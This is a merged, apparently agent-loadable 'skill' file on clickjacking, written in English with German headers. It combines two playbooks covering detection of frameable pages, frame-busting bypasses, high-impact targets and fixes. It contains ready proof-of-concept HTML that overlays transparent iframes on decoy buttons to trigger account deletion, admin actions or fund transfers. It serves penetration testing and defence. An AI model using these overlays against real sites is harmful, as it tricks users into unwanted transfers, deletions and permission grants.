---
name: clickjacking
description: "Clickjacking playbook. Use when testing whether target pages can be framed, whether X-Frame-Options or CSP frame-ancestors are properly configured, and whether UI redress attacks can trigger sensitive actions."
domain: client-side
merged: true
merged_from: [hack-skills:clickjacking, hacking-skills:clickjacking]
---

# clickjacking

> **Fusionierter Skill** — vereint 2 Quell-Skills zu einem: `hack-skills:clickjacking`, `hacking-skills:clickjacking`. Alle Techniken aller Quellen sind unten zusammengeführt, nichts ausgelassen.

## Quelle: hack-skills — clickjacking (164 Zeilen)

# SKILL: Clickjacking — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Clickjacking (UI redress) techniques. Covers iframe transparency tricks, X-Frame-Options bypass, CSP frame-ancestors, multi-step clickjacking, drag-and-drop attacks, and chaining with other vulnerabilities. Often a "low severity" finding that becomes critical when targeting admin actions.

## 1. CORE CONCEPT

Clickjacking loads a target page in a transparent iframe overlaid on an attacker's page. The victim sees the attacker's UI but clicks on the invisible target page, performing unintended actions.

```html
<style>
  iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.0001; z-index: 2; }
  .decoy { position: absolute; top: 200px; left: 100px; z-index: 1; }
</style>
<div class="decoy"><button>Click to win a prize!</button></div>
<iframe src="https://target.com/account/delete?confirm=yes"></iframe>
```

---

## 2. DETECTION — IS THE PAGE FRAMEABLE?

### Check X-Frame-Options Header

```
X-Frame-Options: DENY           → cannot be framed (secure)
X-Frame-Options: SAMEORIGIN     → only same-origin framing (secure for cross-origin)
X-Frame-Options: ALLOW-FROM uri → deprecated, browser support inconsistent
(header absent)                  → frameable! (vulnerable)
```

### Check CSP frame-ancestors

```
Content-Security-Policy: frame-ancestors 'none'        → cannot be framed
Content-Security-Policy: frame-ancestors 'self'         → same-origin only
Content-Security-Policy: frame-ancestors https://a.com  → specific origin
(directive absent)                                       → frameable
```

**CSP frame-ancestors supersedes X-Frame-Options** in modern browsers.

### Quick PoC Test

```html
<iframe src="https://target.com/sensitive-action" width="800" height="600"></iframe>
```

If the page loads in the iframe → frameable → potentially vulnerable.

### JavaScript Frame Detection (from target page source)

```javascript
// Common frame-busting code found in target pages:
if (top.location.hostname !== self.location.hostname) {
    top.location.href = self.location.href;
}
```

If this code is present but not using CSP `frame-ancestors`, it can often be bypassed.

---

## 3. PROOF OF CONCEPT TEMPLATES

### Basic Single-Click

```html
<html>
<head><title>Free Prize</title></head>
<body>
<h1>Click the button to claim your prize!</h1>
<style>
  iframe { position: absolute; top: 300px; left: 60px;
           width: 500px; height: 200px; opacity: 0.0001; z-index: 2; }
</style>
<iframe src="https://target.com/account/settings?action=delete"></iframe>
</body>
</html>
```

### Multi-Step Clickjacking

For actions requiring multiple clicks (e.g., "Are you sure?" confirmation):

```html
<div id="step1">
  <button onclick="document.getElementById('step1').style.display='none';
                    document.getElementById('step2').style.display='block';">
    Step 1: Click here
  </button>
</div>
<div id="step2" style="display:none">
  <button>Step 2: Confirm</button>
</div>
<iframe src="https://target.com/admin/action"></iframe>
```

Reposition iframe for each step to align the transparent button with the decoy.

### Drag-and-Drop Clickjacking

Extract data from one iframe to another using HTML5 drag-and-drop events — the victim drags across invisible iframes, transferring tokens or data.

---

## 4. BYPASS TECHNIQUES

### Frame-Busting Script Bypass

Some pages use JavaScript frame-busting:
```javascript
if (top !== self) { top.location = self.location; }
```

**Bypass with sandbox attribute**:
```html
<iframe src="https://target.com" sandbox="allow-forms allow-scripts"></iframe>
<!-- sandbox without allow-top-navigation prevents frame-busting -->
```

### X-Frame-Options ALLOW-FROM Bypass

`ALLOW-FROM` is not supported in Chrome/Safari. If the server relies solely on `ALLOW-FROM`, modern browsers ignore it → page is frameable.

### Double-Framing

If `X-Frame-Options: SAMEORIGIN` is set, but a same-origin page exists that can be framed (without XFO), use that page as an intermediary to frame the target.

---

## 5. HIGH-IMPACT TARGETS

```text
Account deletion page
Email/password change form
Admin panel actions (add user, change role)
Payment confirmation
OAuth authorization ("Allow" button)
Two-factor authentication disable
API key generation
Webhook configuration
```

---

## 6. TESTING CHECKLIST

```
□ Check X-Frame-Options header on sensitive pages
□ Check CSP frame-ancestors directive
□ Create iframe PoC and verify page loads
□ Test frame-busting scripts — try sandbox attribute bypass
□ Identify high-value single-click actions
□ For multi-step actions, build multi-click PoC
□ Test both authenticated and unauthenticated pages
□ Verify ALLOW-FROM behavior across browsers
```

## Quelle: hacking-skills — clickjacking (144 Zeilen)

# Clickjacking

## What Is Broken and Why
Clickjacking (UI redressing) works by embedding a target application inside a transparent or partially-visible iframe on an attacker-controlled page. Victims see decoy UI elements but are actually interacting with the hidden target page underneath. Single-click, single-step actions are the most exploitable (fund transfers, account deletions, permission grants, one-click purchases). The vulnerability exists when a page can be framed, either because framing protection headers are absent or because deployed JavaScript frame-busting code is bypassable.

## Key Signals
- Missing `X-Frame-Options` header (`DENY` or `SAMEORIGIN`)
- Missing `Content-Security-Policy: frame-ancestors 'none'` or `frame-ancestors 'self'`
- Target page loads successfully in a test iframe
- Frame-busting JavaScript present (`top.location === self.location`) but bypassable
- State-changing one-click actions (confirm, approve, authorize, delete) on authenticated pages
- Browser developer tools: Network tab shows page loaded as iframe sub-resource

## Methodology
1. Attempt to load the target page in an iframe using the PoC HTML below.
2. Check response headers for `X-Frame-Options` and `Content-Security-Policy: frame-ancestors`.
3. If the page loads in the iframe, confirm it is the authenticated/functional version.
4. Identify high-impact one-click actions on the framed page.
5. Construct a PoC with overlaid decoy buttons positioned over target action buttons.
6. Test frame-busting bypass techniques if JavaScript protection is detected.
7. Verify across browsers (Chrome, Firefox, Safari) as behavior differs.

## Payloads & Tools
```html
<!-- Basic detection PoC -->
<html>
  <head><title>Clickjacking detection</title></head>
  <body>
    <iframe src="TARGET/" width="800" height="600"></iframe>
  </body>
</html>

<!-- Full attack PoC — transparent overlay -->
<html>
<head>
<style>
  iframe {
    position: absolute;
    width: 800px;
    height: 600px;
    opacity: 0.0;  /* Set to 0.5 for testing, 0.0 for actual attack */
    z-index: 2;
  }
  .decoy {
    position: absolute;
    top: 340px;   /* Adjust to align with target button */
    left: 200px;
    z-index: 1;
    background: #ff0000;
    padding: 10px 20px;
    cursor: pointer;
  }
</style>
</head>
<body>
  <div class="decoy">Click here to win a prize!</div>
  <iframe src="TARGET/account/delete" scrolling="no"></iframe>
</body>
</html>

<!-- Double-framing to bypass parent.location frame-busting -->
<html>
<body>
  <iframe src="attacker-inner.html">
    <!-- attacker-inner.html contains iframe of TARGET/ -->
  </iframe>
</body>
</html>
<!-- attacker-inner.html: -->
<iframe src="TARGET/"></iframe>

<!-- Sandbox attribute to disable frame-busting JS -->
<iframe src="TARGET/" sandbox="allow-forms allow-scripts allow-same-origin"></iframe>
<!-- Note: omit allow-top-navigation to prevent frame-busting -->

<!-- Disable JS entirely (IE restricted zone) -->
<iframe src="TARGET/" security="restricted"></iframe>

<!-- Browser header check -->
curl -s -I TARGET/ | grep -i "x-frame-options\|frame-ancestors"

<!-- Burp Suite: identify clickjacking -->
<!-- Proxy -> HTTP History -> right-click response -> 'Check Clickjacking' (via extension) -->
<!-- Or: manually check Response headers for X-Frame-Options -->
```

## Bypass Techniques
- **Double framing**: Nest target within two iframes; `parent.location` assignment fails silently when attacker controls the middle frame
- **sandbox attribute**: `sandbox="allow-forms allow-scripts"` without `allow-top-navigation` disables frame-busting navigation
- **HTML5 sandbox without allow-top-navigation**: frame-busting `top.location = self.location` throws security exception, ignored
- **onBeforeUnload exploitation**: Attacker page fires repeated navigation requests; victim's browser prompts "are you sure?" canceling frame-bust
- **Location variable redefinition (IE7/8, Safari 4)**: Override `window.location` as a non-writable property, breaking frame-busting assignment
- **XSS filter abuse**: Inject the beginning of the frame-busting script into a URL parameter, inducing a false XSS positive that deactivates the script
- **designMode**: Some browsers allow setting document to designMode, preventing frame-bust navigation
- **Drag-and-drop clickjacking**: Multipart attack using browser drag-and-drop API instead of clicks

## Exploitation Scenarios
**Scenario 1 — Unauthorized Fund Transfer**
Setup: Banking transfer form is a single page with pre-filled amounts from URL parameters; no clickjacking protection.
Trigger: Attacker crafts `TARGET/transfer?amount=500&to=attacker-acct`, embeds in transparent iframe with opacity 0.0, overlaid with "Confirm your free delivery" button.
Impact: Victim clicks decoy button, unknowingly submits transfer; funds moved to attacker account.

**Scenario 2 — Social Media Permission Grant**
Setup: OAuth permission grant page can be framed; one "Authorize" button present.
Trigger: Attacker embeds transparent iframe of permission page over a "Play game" button on their site.
Impact: Victim grants application full permission to their social media account without realizing.

**Scenario 3 — Account Deletion via Double-Framing**
Setup: Account deletion page has frame-busting JavaScript (`if (top != self) top.location = self.location`).
Trigger: Attacker uses double-framing to neutralize frame-bust; positions "Delete my account" button under a decoy.
Impact: Victim's account deleted; frame-busting protection rendered ineffective.

## False Positives
- `X-Frame-Options: SAMEORIGIN` correctly deployed — page loads in iframe from same origin but not cross-origin (not exploitable from attacker site)
- `Content-Security-Policy: frame-ancestors 'self'` properly preventing cross-origin framing
- JavaScript frame-busting that actually works in the tested browser (test across all major browsers)
- Target page requires form submission or multi-step interaction (single-click requirement not met)

## Fix Patterns
- Preferred: `Content-Security-Policy: frame-ancestors 'none'` (no framing at all) or `frame-ancestors 'self'` (same-origin only)
- Legacy support: `X-Frame-Options: DENY` or `X-Frame-Options: SAMEORIGIN` (supported IE8+, Firefox 3.6.9+, Chrome 4.1+)
- `X-Frame-Options: ALLOW-FROM origin` for specific trusted origins (not supported in Chrome/Safari — use CSP instead)
- Do not rely solely on JavaScript frame-busting — all known JS techniques are bypassable
- For high-value actions: require re-authentication or CSRF tokens that change per-page-load, reducing clickjacking payoff
- Apply defense-in-depth: combine CSP frame-ancestors with SameSite=Strict cookies to require direct navigation for sensitive actions

## Related Skills

Clickjacking is a user-assisted [[csrf]] variant: rather than forging a request invisibly, it tricks the victim into clicking a UI element that triggers the sensitive action. If the target page lacks `SameSite` protections and also lacks framing protection, both clickjacking and [[csrf]] may be independently exploitable. If the page can be framed and also reflects user input, an [[xss-reflected]] payload can be delivered inside the frame to capture interactions. [[cors-misconfig]] on a parent-framed page can be combined to read responses from the framed origin.
